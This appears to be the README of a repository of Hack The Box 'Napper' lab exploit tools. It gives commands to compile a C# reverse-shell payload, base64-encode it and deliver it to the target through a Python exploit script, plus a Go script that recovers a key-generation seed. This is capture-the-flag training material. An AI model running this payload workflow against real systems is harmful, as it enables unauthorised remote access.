# HTB Napper

WriteUp: [https://gunzf0x.github.io/pentesting/posts/napper/](https://gunzf0x.github.io/pentesting/posts/napper/)

- `C#` and `Python` scripts to gain access to [HTB Napper](https://www.hackthebox.com/machines/napper) machine abusing `Elastic` vulnerability.
- `Go` script to get seed from a process generating keys.

## Reverse shell

### Usage

First, install needed tools to compile `C#` on Linux:
```shell-session
❯ sudo apt install mono-devel -y
```
Then compile the payload.cs file running:
```shell-session
❯ mcs -out:payload.exe payload.cs
```
Pass the generated payload to `base64`:
```shell-session
❯ base64 -w0 payload.exe
```
and use the `Python` script to execute the payload:
```shell-session
❯ python3 naplistener_exploit.py -t https://napper.htb -c '<payload-base-64>'
```


## Get seed
`Go` script used to find seed of a semi-random process (based on [this script](https://raw.githubusercontent.com/0tonoon/Napper_Script/main/Pass_script)):

### Usage
```
❯ go run main.go
```
